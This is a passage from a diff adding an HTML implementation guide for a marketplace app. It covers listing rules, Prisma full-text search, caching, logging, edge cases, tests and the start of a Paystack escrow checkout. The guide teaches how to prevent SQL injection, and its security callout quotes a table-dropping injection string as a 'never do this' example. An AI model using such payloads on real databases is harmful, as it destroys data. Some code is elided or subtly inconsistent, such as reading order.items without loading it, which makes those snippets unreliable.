+  <span class="var">USED_EXCELLENT</span>:{ <span class="var">minPhotos</span>: <span class="num">4</span>, <span class="var">requiresBatteryShot</span>: <span class="kw">false</span> },
+  <span class="var">USED_GOOD</span>:     { <span class="var">minPhotos</span>: <span class="num">4</span>, <span class="var">requiresBatteryShot</span>: <span class="kw">true</span>  }, <span class="cm">// Phones & laptops</span>
+  <span class="var">USED_FAIR</span>:     { <span class="var">minPhotos</span>: <span class="num">5</span>, <span class="var">requiresBatteryShot</span>: <span class="kw">true</span>  },
+  <span class="var">FOR_PARTS</span>:     { <span class="var">minPhotos</span>: <span class="num">3</span>, <span class="var">requiresBatteryShot</span>: <span class="kw">false</span> },
+}
+
+<span class="kw">const</span> <span class="var">BATTERY_CATEGORIES</span> = <span class="kw">new</span> <span class="fn">Set</span>([<span class="str">'phones'</span>, <span class="str">'laptops'</span>, <span class="str">'tablets'</span>])
+
+<span class="kw">export async function</span> <span class="fn">createListing</span>(<span class="var">sellerId: string</span>, <span class="var">dto: CreateListingDto</span>) {
+  <span class="kw">const</span> <span class="var">store</span> = <span class="kw">await</span> <span class="var">prisma.store.findUnique</span>({ <span class="var">where</span>: { <span class="var">ownerId</span>: <span class="var">sellerId</span> } })
+  <span class="kw">if</span> (!<span class="var">store</span>) <span class="kw">throw new</span> <span class="fn">ForbiddenError</span>(<span class="str">'Create a store before listing items'</span>)
+
+  <span class="kw">const</span> <span class="var">reqs</span> = <span class="var">CONDITION_REQUIREMENTS</span>[<span class="var">dto.condition</span>]
+  <span class="kw">if</span> (<span class="var">dto.imagePaths.length</span> < <span class="var">reqs.minPhotos</span>)
+    <span class="kw">throw new</span> <span class="fn">ValidationError</span>(`${<span class="var">dto.condition</span>} requires at least ${<span class="var">reqs.minPhotos</span>} photos`)
+
+  <span class="kw">const</span> <span class="var">isBatteryCategory</span> = <span class="var">BATTERY_CATEGORIES.has</span>(<span class="var">dto.categorySlug</span>)
+  <span class="kw">if</span> (<span class="var">reqs.requiresBatteryShot</span> && <span class="var">isBatteryCategory</span> && !<span class="var">dto.hasBatteryScreenshot</span>)
+    <span class="kw">throw new</span> <span class="fn">ValidationError</span>(<span class="str">'Battery health screenshot is required for this condition grade'</span>)
+
+  <span class="cm">// New seller stock limit — PRD safety feature to limit fraud from new sellers</span>
+  <span class="kw">const</span> <span class="var">totalSales</span> = <span class="kw">await</span> <span class="var">prisma.order.count</span>({ <span class="var">where</span>: { <span class="var">storeId</span>: <span class="var">store.id</span>, <span class="var">status</span>: <span class="str">'COMPLETED'</span> } })
+  <span class="kw">if</span> (<span class="var">totalSales</span> === <span class="num">0</span>) {  <span class="cm">// Brand new seller with no completed sales</span>
+    <span class="kw">const</span> <span class="var">activeListings</span> = <span class="kw">await</span> <span class="var">prisma.listing.count</span>({
+      <span class="var">where</span>: { <span class="var">storeId</span>: <span class="var">store.id</span>, <span class="var">status</span>: { <span class="var">in</span>: [<span class="str">'ACTIVE'</span>, <span class="str">'DRAFT'</span>] } }
+    })
+    <span class="kw">if</span> (<span class="var">activeListings</span> >= <span class="num">3</span>)
+      <span class="kw">throw new</span> <span class="fn">ForbiddenError</span>(<span class="str">'New sellers are limited to 3 listings until their first sale completes'</span>)
+  }
+
+  <span class="kw">return</span> <span class="var">prisma.listing.create</span>({ <span class="var">data</span>: { ...
+    <span class="var">storeId</span>:       <span class="var">store.id</span>,
+    <span class="var">policySnapshot</span>: <span class="var">store.returnPolicy</span>,  <span class="cm">// Snapshot at listing creation too</span>
+    <span class="var">status</span>:        <span class="var">dto.isDraft</span> ? <span class="str">'DRAFT'</span> : <span class="str">'ACTIVE'</span>,
+  }})
+}</code></pre>
+
+  <h3>Step 2 — Full-Text Search with Prisma Raw Query</h3>
+  <p>Prisma's <code>findMany</code> doesn't support PostgreSQL's <code>@@</code> full-text search operator natively. Use <code>prisma.$queryRaw</code> for search, but use regular Prisma queries for everything else. The <code>search_vector</code> tsvector column is maintained by a database trigger (defined in the architecture blueprint).</p>
+
+  <pre><code><span class="cm">// apps/api/src/services/listing.service.ts</span>
+
+<span class="kw">export async function</span> <span class="fn">searchListings</span>(<span class="var">params: SearchParams</span>) {
+  <span class="kw">const</span> {
+    <span class="var">query</span>,         <span class="cm">// Search term from user</span>
+    <span class="var">category</span>,      <span class="cm">// Optional category slug filter</span>
+    <span class="var">minPrice</span>,      <span class="cm">// Optional price range filter</span>
+    <span class="var">maxPrice</span>,
+    <span class="var">condition</span>,     <span class="cm">// Optional condition grade filter</span>
+    <span class="var">sellerType</span>,    <span class="cm">// 'student' | 'reseller' | undefined</span>
+    <span class="var">cursor</span>,        <span class="cm">// Cursor for pagination (last item's id from previous page)</span>
+    <span class="var">limit</span> = <span class="num">20</span>,    <span class="cm">// Max 50 items per page</span>
+    <span class="var">sortBy</span> = <span class="str">'newest'</span>,
+  } = <span class="var">params</span>
+
+  <span class="cm">// SECURITY: Use Prisma.sql tagged template for parameterized queries.</span>
+  <span class="cm">// NEVER string-interpolate user input directly into SQL.</span>
+  <span class="cm">// Prisma.sql prevents SQL injection by parameterizing all values.</span>
+  <span class="kw">const</span> <span class="var">tsQuery</span> = <span class="var">query</span>
+    ? <span class="var">Prisma.sql</span>`<span class="var">AND</span> <span class="var">l.search_vector</span> @@ <span class="fn">plainto_tsquery</span>(<span class="str">'english'</span>, ${<span class="var">query</span>})`
+    : <span class="var">Prisma.sql</span>``  <span class="cm">// No search — return all (filtered by other params)</span>
+
+  <span class="kw">const</span> <span class="var">categoryFilter</span> = <span class="var">category</span>
+    ? <span class="var">Prisma.sql</span>`<span class="var">AND</span> <span class="var">c.slug</span> = ${<span class="var">category</span>}`
+    : <span class="var">Prisma.sql</span>``
+
+  <span class="kw">const</span> <span class="var">priceFilter</span> = <span class="var">Prisma.sql</span>`
+    ${<span class="var">minPrice</span> != <span class="kw">null</span> ? <span class="var">Prisma.sql</span>`<span class="var">AND</span> <span class="var">l.price</span> &gt;= ${<span class="var">minPrice</span>}` : <span class="var">Prisma.sql</span>``}
+    ${<span class="var">maxPrice</span> != <span class="kw">null</span> ? <span class="var">Prisma.sql</span>`<span class="var">AND</span> <span class="var">l.price</span> &lt;= ${<span class="var">maxPrice</span>}` : <span class="var">Prisma.sql</span>``}
+  `
+
+  <span class="kw">const</span> <span class="var">conditionFilter</span> = <span class="var">condition</span>
+    ? <span class="var">Prisma.sql</span>`<span class="var">AND</span> <span class="var">l.condition</span> = ${<span class="var">condition</span>}::"ConditionGrade"`
+    : <span class="var">Prisma.sql</span>``
+
+  <span class="kw">const</span> <span class="var">sellerFilter</span> = <span class="var">sellerType</span> === <span class="str">'student'</span>
+    ? <span class="var">Prisma.sql</span>`<span class="var">AND</span> <span class="var">u.verification_status</span> = <span class="str">'VERIFIED'</span>`
+    : <span class="var">sellerType</span> === <span class="str">'reseller'</span>
+    ? <span class="var">Prisma.sql</span>`<span class="var">AND</span> <span class="var">u.verification_status</span> != <span class="str">'VERIFIED'</span>`
+    : <span class="var">Prisma.sql</span>``
+
+  <span class="cm">// Cursor-based pagination: more efficient than OFFSET at scale.</span>
+  <span class="cm">// OFFSET=10000 forces PG to scan and discard 10,000 rows. Cursor does not.</span>
+  <span class="kw">const</span> <span class="var">cursorFilter</span> = <span class="var">cursor</span>
+    ? <span class="var">Prisma.sql</span>`<span class="var">AND</span> <span class="var">l.id</span> &lt; ${<span class="var">cursor</span>}`  <span class="cm">// Assumes newest-first; adjust for other sorts</span>
+    : <span class="var">Prisma.sql</span>``
+
+  <span class="kw">const</span> <span class="var">orderClause</span> = <span class="var">sortBy</span> === <span class="str">'price_asc'</span>  ? <span class="var">Prisma.sql</span>`<span class="var">ORDER BY</span> <span class="var">l.price ASC</span>`
+                      : <span class="var">sortBy</span> === <span class="str">'price_desc'</span> ? <span class="var">Prisma.sql</span>`<span class="var">ORDER BY</span> <span class="var">l.price DESC</span>`
+                      : <span class="var">sortBy</span> === <span class="str">'rating'</span>     ? <span class="var">Prisma.sql</span>`<span class="var">ORDER BY</span> <span class="var">avg_rating DESC NULLS LAST</span>`
+                      :                               <span class="var">Prisma.sql</span>`<span class="var">ORDER BY</span> <span class="var">l.created_at DESC</span>`
+
+  <span class="kw">const</span> <span class="var">safeLimit</span> = <span class="var">Math.min</span>(<span class="var">limit</span>, <span class="num">50</span>)  <span class="cm">// Cap at 50 regardless of what client sends</span>
+
+  <span class="kw">const</span> <span class="var">results</span> = <span class="kw">await</span> <span class="var">prisma</span>.<span class="var">$queryRaw</span>&lt;<span class="type">ListingSearchResult</span>[]&gt;<span class="var">Prisma.sql</span>`
+    <span class="var">SELECT</span>
+      <span class="var">l.id</span>, <span class="var">l.title</span>, <span class="var">l.price</span>, <span class="var">l.condition</span>, <span class="var">l.image_paths</span>[<span class="num">1</span>] <span class="var">AS</span> <span class="var">primary_image</span>,
+      <span class="var">s.handle</span> <span class="var">AS</span> <span class="var">store_handle</span>, <span class="var">s.name</span> <span class="var">AS</span> <span class="var">store_name</span>,
+      <span class="var">u.verification_status</span>, <span class="var">l.created_at</span>,
+      <span class="cm">-- Rank by relevance when query is provided</span>
+      ${<span class="var">query</span> ? <span class="var">Prisma.sql</span>`<span class="fn">ts_rank</span>(<span class="var">l.search_vector</span>, <span class="fn">plainto_tsquery</span>(<span class="str">'english'</span>, ${<span class="var">query</span>})) <span class="var">AS</span> <span class="var">rank</span>` : <span class="var">Prisma.sql</span>`<span class="num">1</span> <span class="var">AS</span> <span class="var">rank</span>`}
+    <span class="var">FROM</span> <span class="var">listings l</span>
+    <span class="var">JOIN</span> <span class="var">stores s ON l.store_id</span> = <span class="var">s.id</span>
+    <span class="var">JOIN</span> <span class="var">users u ON s.owner_id</span> = <span class="var">u.id</span>
+    <span class="var">JOIN</span> <span class="var">categories c ON l.category_id</span> = <span class="var">c.id</span>
+    <span class="var">WHERE</span> <span class="var">l.status</span> = <span class="str">'ACTIVE'</span>
+    ${<span class="var">tsQuery</span>} ${<span class="var">categoryFilter</span>} ${<span class="var">priceFilter</span>} ${<span class="var">conditionFilter</span>} ${<span class="var">sellerFilter</span>} ${<span class="var">cursorFilter</span>}
+    ${<span class="var">orderClause</span>}
+    <span class="var">LIMIT</span> ${<span class="var">safeLimit</span> + <span class="num">1</span>}  <span class="cm">-- Fetch N+1 to determine if there's a next page</span>
+  `
+
+  <span class="kw">const</span> <span class="var">hasNextPage</span> = <span class="var">results.length</span> > <span class="var">safeLimit</span>
+  <span class="kw">const</span> <span class="var">items</span> = <span class="var">hasNextPage</span> ? <span class="var">results.slice</span>(<span class="num">0</span>, <span class="var">safeLimit</span>) : <span class="var">results</span>
+  <span class="kw">return</span> {
+    <span class="var">data</span>:       <span class="var">items</span>,
+    <span class="var">nextCursor</span>: <span class="var">hasNextPage</span> ? <span class="var">items.at</span>(-<span class="num">1</span>)?.<span class="var">id</span> : <span class="kw">null</span>,
+    <span class="var">hasNextPage</span>,
+  }
+}</code></pre>
+
+  <!-- PILLAR 2 -->
+  <div class="pillar" id="m3-perf"><span class="pillar-badge pb-perf">Pillar 2</span><h2>Performance & Optimization</h2></div>
+
+  <ul class="ul">
+    <li><strong>GIN index on <code>search_vector</code> — non-negotiable.</strong> Without this index, every full-text search is a sequential scan of the entire <code>listings</code> table. With it, PostgreSQL jumps directly to matching rows. At 10,000 listings this is the difference between 2000ms and 8ms response times. Run the GIN index SQL from the architecture blueprint before any performance testing.</li>
+    <li><strong>Composite indexes for filter combinations.</strong> The most common query is <code>WHERE status = 'ACTIVE' AND category_id = ? AND price BETWEEN ? AND ?</code>. Create <code>CREATE INDEX idx_listings_active_cat_price ON listings(status, category_id, price) WHERE status = 'ACTIVE'</code>. The partial index (<code>WHERE status = 'ACTIVE'</code>) only indexes active listings, making it much smaller and faster.</li>
+    <li><strong>Redis cache for search results.</strong> Cache the first page of popular searches (no filters, top categories) in Redis with a 2-minute TTL. Cache key: <code>search:{md5(queryString)}</code>. This serves the majority of browsing traffic (home page, category pages, common searches) from memory. Only cache first-page results — paginated results are unique to user session and not worth caching.</li>
+    <li><strong>Lazy loading with React Suspense for infinite scroll.</strong> The listing grid uses React Suspense with a <code>&lt;Suspense fallback={&lt;SkeletonGrid /&gt;}&gt;</code> boundary. The initial 20 listings are server-rendered. "Load more" triggers a client-side fetch using the cursor from the previous response. This avoids shipping all listings to the browser at once.</li>
+    <li><strong>Image CDN transforms.</strong> Listing photos stored in Supabase Storage are served through a transformation URL: <code>supabase.storage.from('product-images').getPublicUrl(path, { transform: { width: 400, quality: 80 } })</code>. The listing card displays a 400px thumbnail. The lightbox requests the original. Never serve 3000×4000px source images to a 400px card.</li>
+  </ul>
+
+  <!-- PILLAR 3 -->
+  <div class="pillar" id="m3-sec"><span class="pillar-badge pb-sec">Pillar 3</span><h2>Security & Error Handling</h2></div>
+
+  <div class="callout callout-red">
+    <strong>SQL Injection Prevention in Search</strong>
+    <p>The search query is user-supplied text that goes directly into a PostgreSQL full-text search function. <strong>Never do this:</strong> <code>prisma.$queryRawUnsafe(`... plainto_tsquery('english', '${query}')`)</code> — a user could input <code>'; DROP TABLE listings; --</code>. <strong>Always use <code>Prisma.sql</code> tagged template literals</strong> for <code>$queryRaw</code> calls. Prisma's tagged template automatically parameterizes all values, which PostgreSQL treats as data — not executable SQL. This is the <em>only</em> safe way to use <code>$queryRaw</code>.</p>
+  </div>
+
+  <ul class="ul">
+    <li><strong>Payload size limiting on list endpoints.</strong> The <code>limit</code> query parameter is capped at 50 in the Zod schema (<code>z.coerce.number().int().min(1).max(50).default(20)</code>). Even if a client sends <code>?limit=10000</code>, they get at most 50 items. This prevents a single query from returning megabytes of JSON that crashes the frontend or exhausts the database connection.</li>
+    <li><strong>Image path ownership validation.</strong> When creating a listing, validate that each path in <code>imagePaths</code> starts with the expected bucket prefix. A seller should not be able to reference another seller's product photos by submitting arbitrary Supabase Storage paths.</li>
+    <li><strong>Graceful search degradation.</strong> If the PostgreSQL full-text search index is being rebuilt (rare but possible after large imports), the <code>@@</code> operator still works but is slow. Wrap the search query in a Redis circuit breaker: if 3 search requests take > 5 seconds in a 60-second window, switch to a simpler <code>ILIKE</code> query and log a WARN. Users get slower but functional search instead of timeouts.</li>
+  </ul>
+
+  <!-- PILLAR 4 -->
+  <div class="pillar" id="m3-log"><span class="pillar-badge pb-log">Pillar 4</span><h2>Logging & Observability</h2></div>
+
+  <div class="log-grid">
+    <div class="log-card log-info">
+      <h4>INFO</h4>
+      <ul>
+        <li>Search executed (query hash, filters, resultCount, durationMs, cacheHit)</li>
+        <li>Listing created (listingId, storeId, condition, category, price)</li>
+        <li>Listing published from DRAFT (listingId, storeId)</li>
+        <li>Listing marked SOLD (listingId, storeId, finalPrice)</li>
+        <li>New-seller stock limit enforced (storeId, currentCount)</li>
+      </ul>
+    </div>
+    <div class="log-card log-warn">
+      <h4>WARN</h4>
+      <ul>
+        <li>Search took > 3000ms — index may be degraded (durationMs, query)</li>
+        <li>Redis cache miss rate > 80% for popular queries (cacheKey, missRate)</li>
+        <li>Image path ownership validation failed (userId, suspiciousPath)</li>
+        <li>Search query > 500 chars truncated (originalLength)</li>
+        <li>Payload limit hit — client requested > 50 items (requestedLimit, ip)</li>
+      </ul>
+    </div>
+    <div class="log-card log-fatal">
+      <h4>FATAL</h4>
+      <ul>
+        <li>tsvector trigger not installed — search returning 0 results (tableCheck)</li>
+        <li>GIN index missing — search taking > 10s (indexCheck, listingCount)</li>
+        <li>$queryRaw returned incompatible type — schema drift detected</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- PILLAR 5 -->
+  <div class="pillar" id="m3-edge"><span class="pillar-badge pb-edge">Pillar 5</span><h2>Edge Cases & Missed Scenarios</h2></div>
+
+  <div class="edge-grid">
+    <div class="edge-card">
+      <h4>Listing sold mid-search results page</h4>
+      <div class="edge-problem">A buyer is browsing search results. A listing appears on page 1. By the time they click it, another buyer has purchased the last unit and the listing is now SOLD. The buyer sees the listing detail but cannot buy it.</div>
+      <div class="edge-fix">The listing detail page always does a fresh server-side fetch (no ISR — listings change too frequently). If <code>listing.stock === 0</code> or <code>listing.status !== 'ACTIVE'</code>, the Buy button is disabled with "Just sold — check back later." Show the seller's other active listings as alternatives. Never cache listing detail pages for more than 5 seconds.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Search returns ghost listings (status changed)</h4>
+      <div class="edge-problem">Search results are cached in Redis for 2 minutes. During that window, a seller pauses or deletes a listing. The cached results still include it. A buyer clicks it and gets a 404.</div>
+      <div class="edge-fix">The listing detail page handles 404 gracefully with a "This listing is no longer available" page and a link back to search. More importantly: when a listing status changes to SOLD/PAUSED/DRAFT, call <code>invalidateSearchCache()</code> which deletes all search cache keys containing that category slug. The 2-minute Redis TTL is the acceptable staleness window for search results.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Cursor invalidation after seller re-orders listings</h4>
+      <div class="edge-problem">A buyer is paginating through results. On page 3, the cursor points to listing ID "abc". Meanwhile, the seller updates their listing (changing price, description). The updated listing now has a new <code>updated_at</code> timestamp. If sorting by "newest update", the cursor-based pagination breaks — the listing is in a different position now.</div>
+      <div class="edge-fix">Always cursor on the <code>id</code> field (which never changes), not on <code>updated_at</code> or <code>price</code>. Sort is applied as a secondary-only criterion. The SQL ordering is: <code>ORDER BY created_at DESC, id DESC</code> — the ID tie-breaker ensures stable cursor positioning regardless of other field changes.</div>
+    </div>
+    <div class="edge-card">
+      <h4>Search query too long / adversarial input</h4>
+      <div class="edge-problem">A bot sends a search query 10,000 characters long. <code>plainto_tsquery('english', [10k chars])</code> could be slow and expensive for the database.</div>
+      <div class="edge-fix">Zod schema on the search route: <code>query: z.string().max(200).optional()</code>. Any query longer than 200 characters returns a 400 error immediately without hitting the database. The rate limiter (60 requests/minute for search) further limits bot abuse. Log any attempts at queries > 200 chars as WARN with the IP address.</div>
+    </div>
+  </div>
+
+  <!-- PILLAR 6 -->
+  <div class="pillar" id="m3-test"><span class="pillar-badge pb-test">Pillar 6</span><h2>Testing & Deployment Readiness</h2></div>
+  <div class="test-grid">
+    <div class="test-card">
+      <h4>Unit Tests (Vitest)</h4>
+      <ul>
+        <li><code>createListing()</code> throws if photo count < condition minimum</li>
+        <li><code>createListing()</code> throws if battery screenshot missing for USED_GOOD laptop</li>
+        <li>New seller blocked from 4th listing before first sale completes</li>
+        <li>Search limit capped at 50 regardless of request param</li>
+        <li><code>Prisma.sql</code> is used for all <code>$queryRaw</code> calls (never <code>$queryRawUnsafe</code>)</li>
+        <li>Image path ownership check rejects cross-user paths</li>
+        <li>Cursor returns correct <code>nextCursor</code> when exactly 20 items returned</li>
+      </ul>
+    </div>
+    <div class="test-card">
+      <h4>E2E Tests (Playwright)</h4>
+      <ul>
+        <li>Search "macbook pro" returns relevant results < 500ms with GIN index</li>
+        <li>Category filter returns only listings in that category</li>
+        <li>Student seller filter returns only VERIFIED seller listings</li>
+        <li>Infinite scroll loads next 20 items on scroll to bottom</li>
+        <li>Sold listing shows disabled buy button with "Just sold" message</li>
+        <li>SQL injection attempt in search query returns 400, no DB error leaks</li>
+        <li>Search query > 200 chars returns 400 immediately</li>
+        <li>First search page loads server-rendered (content visible in curl)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════
+     MODULE 04 — ESCROW CHECKOUT & PAYOUTS
+════════════════════════════════════════ -->
+<div class="section" id="m4">
+  <div class="sec-label">Module 04</div>
+  <div class="module-header">
+    <div class="mh-num">04</div>
+    <div class="mh-content">
+      <div class="mh-label">Feature Module</div>
+      <div class="mh-title">Escrow Checkout & Payouts</div>
+      <div class="mh-sub">Paystack transaction initialization, webhook processing, escrow finite state machine, 7-day auto-release, seller wallet management, and payout transfer flows.</div>
+      <div class="mh-tags">
+        <span class="mh-tag" style="color:var(--paystack);border-color:rgba(0,195,247,0.3)">Paystack</span>
+        <span class="mh-tag" style="color:var(--green);border-color:rgba(34,197,94,0.25)">Escrow FSM</span>
+        <span class="mh-tag" style="color:var(--rose);border-color:rgba(244,63,94,0.25)">HMAC-SHA512</span>
+        <span class="mh-tag" style="color:var(--amber);border-color:rgba(245,158,11,0.25)">Idempotency</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- PILLAR 1 -->
+  <div class="pillar" id="m4-impl"><span class="pillar-badge pb-impl">Pillar 1</span><h2>Core Implementation Logic</h2></div>
+
+  <h3>Step 1 — Checkout Initiation (Order → Paystack)</h3>
+
+  <div class="callout callout-blue">
+    <strong>Escrow Rule R-01 from the Escrow Tech Spec</strong>
+    <p>Escrow is created only after a verified <code>charge.success</code> webhook — never on the redirect callback alone. The redirect callback's only job is to show the user a "processing" screen and poll for order status. Escrow state is set exclusively by the webhook handler. A buyer who manually hits the callback URL without paying must never get their order processed.</p>
+  </div>
+
+  <pre><code><span class="cm">// apps/api/src/services/order.service.ts</span>
+<span class="cm">// The full initiateOrder flow with all production-ready guards</span>
+
+<span class="kw">export async function</span> <span class="fn">initiateOrder</span>(<span class="var">dto: InitiateOrderDto</span>) {
+  <span class="cm">// ── GUARD 1: Fetch listing with full relational context ──────────</span>
+  <span class="kw">const</span> <span class="var">listing</span> = <span class="kw">await</span> <span class="var">prisma.listing.findUniqueOrThrow</span>({
+    <span class="var">where</span>: { <span class="var">id</span>: <span class="var">dto.listingId</span>, <span class="var">status</span>: <span class="str">'ACTIVE'</span> },
+    <span class="var">include</span>: { <span class="var">store</span>: { <span class="var">include</span>: { <span class="var">owner</span>: <span class="kw">true</span> } } }
+  })
+
+  <span class="cm">// ── GUARD 2: Business rule violations ───────────────────────────</span>
+  <span class="kw">if</span> (<span class="var">listing.store.ownerId</span> === <span class="var">dto.buyerId</span>)
+    <span class="kw">throw new</span> <span class="fn">ForbiddenError</span>(<span class="str">'You cannot purchase your own listing'</span>)
+  <span class="kw">if</span> (<span class="var">listing.stock</span> < <span class="var">dto.quantity</span>)
+    <span class="kw">throw new</span> <span class="fn">BadRequestError</span>(<span class="str">'Insufficient stock'</span>)
+  <span class="kw">if</span> (!<span class="var">listing.store.owner.paystackRecipientCode</span>)
+    <span class="kw">throw new</span> <span class="fn">BadRequestError</span>(<span class="str">'This seller has not set up payment details yet'</span>)
+
+  <span class="cm">// ── Fee calculation ──────────────────────────────────────────────</span>
+  <span class="kw">const</span> <span class="var">isStudent</span>   = <span class="var">listing.store.owner.verificationStatus</span> === <span class="str">'VERIFIED'</span>
+  <span class="kw">const</span> <span class="var">feeRate</span>    = <span class="kw">new</span> <span class="fn">Decimal</span>(<span class="var">isStudent</span> ? <span class="str">'0.05'</span> : <span class="str">'0.08'</span>)
+  <span class="kw">const</span> <span class="var">unitPrice</span>  = <span class="kw">new</span> <span class="fn">Decimal</span>(<span class="var">listing.price</span>)
+  <span class="kw">const</span> <span class="var">total</span>      = <span class="var">unitPrice</span>.<span class="fn">mul</span>(<span class="var">dto.quantity</span>)
+  <span class="kw">const</span> <span class="var">fee</span>        = <span class="var">total</span>.<span class="fn">mul</span>(<span class="var">feeRate</span>).<span class="fn">toDecimalPlaces</span>(<span class="num">2</span>, <span class="var">Decimal.ROUND_UP</span>)
+  <span class="kw">const</span> <span class="var">sellerAmt</span>  = <span class="var">total</span>.<span class="fn">minus</span>(<span class="var">fee</span>)
+
+  <span class="cm">// ── Generate reference before DB write ──────────────────────────</span>
+  <span class="cm">// The reference is our internal ID for linking the Paystack tx to an order.</span>
+  <span class="cm">// Format is human-readable for support tickets and Paystack dashboard.</span>
+  <span class="kw">const</span> <span class="var">paystackRef</span> = `ushop_${<span class="fn">Date.now</span>()}_${<span class="var">crypto</span>.<span class="fn">randomUUID</span>().<span class="fn">slice</span>(<span class="num">0</span>,<span class="num">8</span>)}`
+
+  <span class="cm">// ── Atomic DB write ──────────────────────────────────────────────</span>
+  <span class="cm">// Both the order creation AND the stock reservation happen in one transaction.</span>
+  <span class="cm">// If either fails, neither happens. No orphan orders, no over-sold stock.</span>
+  <span class="kw">const</span> <span class="var">order</span> = <span class="kw">await</span> <span class="var">prisma</span>.<span class="var">$transaction</span>(<span class="kw">async</span> (<span class="var">tx</span>) => {
+    <span class="kw">const</span> <span class="var">newOrder</span> = <span class="kw">await</span> <span class="var">tx.order.create</span>({ <span class="var">data</span>: {
+      <span class="var">buyerId</span>: <span class="var">dto.buyerId</span>, <span class="var">storeId</span>: <span class="var">listing.storeId</span>,
+      <span class="var">totalAmount</span>: <span class="var">total</span>, <span class="var">platformFee</span>: <span class="var">fee</span>, <span class="var">sellerAmount</span>: <span class="var">sellerAmt</span>,
+      <span class="var">paystackRef</span>,
+      <span class="var">shippingAddress</span>: <span class="var">dto.shippingAddress</span>,
+      <span class="var">policySnapshot</span>:  <span class="var">listing.store.returnPolicy</span>,  <span class="cm">// R-10: immutable at checkout</span>
+      <span class="var">status</span>: <span class="str">'PENDING_PAYMENT'</span>,
+      <span class="var">items</span>: { <span class="var">create</span>: { <span class="var">listingId</span>: <span class="var">dto.listingId</span>, <span class="var">quantity</span>: <span class="var">dto.quantity</span>, <span class="var">unitPrice</span>: <span class="var">unitPrice</span> } }
+    }})
+    <span class="cm">// Decrement stock atomically — prevents overselling under concurrent load</span>
+    <span class="kw">await</span> <span class="var">tx.listing.update</span>({
+      <span class="var">where</span>: { <span class="var">id</span>: <span class="var">dto.listingId</span>, <span class="var">stock</span>: { <span class="var">gte</span>: <span class="var">dto.quantity</span> } },  <span class="cm">// Guard in WHERE clause</span>
+      <span class="var">data</span>:  { <span class="var">stock</span>: { <span class="var">decrement</span>: <span class="var">dto.quantity</span> } }
+    })
+    <span class="kw">return</span> <span class="var">newOrder</span>
+  })
+
+  <span class="cm">// ── Call Paystack AFTER DB write (cannot roll back Paystack) ─────</span>
+  <span class="kw">const</span> <span class="var">buyer</span> = <span class="kw">await</span> <span class="var">prisma.user.findUniqueOrThrow</span>({ <span class="var">where</span>: { <span class="var">id</span>: <span class="var">dto.buyerId</span> } })
+  <span class="kw">const</span> <span class="var">payment</span> = <span class="kw">await</span> <span class="var">PaystackService</span>.<span class="fn">initializeTransaction</span>({
+    <span class="var">email</span>:        <span class="var">buyer.email</span>,
+    <span class="var">amount</span>:       <span class="fn">toPesewas</span>(<span class="var">total</span>),  <span class="cm">// Paystack uses smallest denomination</span>
+    <span class="var">reference</span>:    <span class="var">paystackRef</span>,
+    <span class="var">callback_url</span>: `${<span class="var">process.env.FRONTEND_URL</span>}/checkout/complete?orderId=${<span class="var">order.id</span>}`,
+    <span class="var">channels</span>:     [<span class="str">'card'</span>, <span class="str">'mobile_money'</span>, <span class="str">'bank'</span>],
+    <span class="var">metadata</span>:     { <span class="var">orderId</span>: <span class="var">order.id</span>, <span class="var">sellerId</span>: <span class="var">listing.store.ownerId</span> }
+  })
+
+  <span class="kw">return</span> { <span class="var">orderId</span>: <span class="var">order.id</span>, <span class="var">authorizationUrl</span>: <span class="var">payment.authorization_url</span> }
+}</code></pre>
+
+  <h3>Step 2 — Webhook Handler: The Financial Heart</h3>
+
+  <pre><code><span class="cm">// apps/api/src/services/webhook.service.ts</span>
+<span class="cm">// handleChargeSuccess implements Escrow Rules R-01, R-02, R-08, R-14</span>
+
+<span class="kw">export async function</span> <span class="fn">handleChargeSuccess</span>(<span class="var">data: PaystackChargeData</span>) {
+  <span class="cm">// Find order by the Paystack reference — this is the link between our DB and Paystack</span>
+  <span class="kw">const</span> <span class="var">order</span> = <span class="kw">await</span> <span class="var">prisma.order.findUnique</span>({ <span class="var">where</span>: { <span class="var">paystackRef</span>: <span class="var">data.reference</span> } })
+  <span class="kw">if</span> (!<span class="var">order</span>) {
+    <span class="var">logger.warn</span>({ <span class="var">ref</span>: <span class="var">data.reference</span> }, <span class="str">'charge.success for unknown reference — possible data corruption'</span>)
+    <span class="kw">return</span>
+  }
+  <span class="cm">// Idempotency: already processed this payment (webhook retry)</span>
+  <span class="kw">if</span> (<span class="var">order.status</span> !== <span class="str">'PENDING_PAYMENT'</span>) {
+    <span class="var">logger.info</span>({ <span class="var">orderId</span>: <span class="var">order.id</span> }, <span class="str">'charge.success duplicate — already processed'</span>)
+    <span class="kw">return</span>
+  }
+
+  <span class="cm">// R-02: escrow_release_at is 7 days from paidAt, not from order creation</span>
+  <span class="kw">const</span> <span class="var">paidAt</span>           = <span class="kw">new</span> <span class="fn">Date</span>()
+  <span class="kw">const</span> <span class="var">escrowReleaseAt</span>  = <span class="kw">new</span> <span class="fn">Date</span>(<span class="var">paidAt.getTime</span>() + <span class="num">7</span> * <span class="num">24</span> * <span class="num">60</span> * <span class="num">60</span> * <span class="num">1000</span>)
+
+  <span class="cm">// R-08: wallet credit and escrow creation are atomic</span>
+  <span class="cm">// Both succeed together or both fail together — no split state</span>
+  <span class="kw">await</span> <span class="var">prisma</span>.<span class="var">$transaction</span>([
+    <span class="var">prisma.order.update</span>({
+      <span class="var">where</span>: { <span class="var">id</span>: <span class="var">order.id</span> },
+      <span class="var">data</span>:  { <span class="var">status</span>: <span class="str">'PAYMENT_RECEIVED'</span>, <span class="var">paidAt</span>, <span class="var">escrowReleaseAt</span> }
+    }),
+    <span class="var">prisma.escrow.create</span>({
+      <span class="var">data</span>: {
+        <span class="var">orderId</span>:    <span class="var">order.id</span>,
+        <span class="var">heldAmount</span>: <span class="var">order.sellerAmount</span>,  <span class="cm">// Only the seller's cut — not the platform fee</span>
+        <span class="var">status</span>:     <span class="str">'HELD'</span>,
+      }
+    }),
+    <span class="cm">// Auto-mark listing as SOLD if stock hits 0</span>
+    <span class="var">prisma.listing.updateMany</span>({
+      <span class="var">where</span>: { <span class="var">id</span>: <span class="var">order.items</span>[<span class="num">0</span>].<span class="var">listingId</span>, <span class="var">stock</span>: <span class="num">0</span> },
+      <span class="var">data</span>:  { <span class="var">status</span>: <span class="str">'SOLD'</span> }
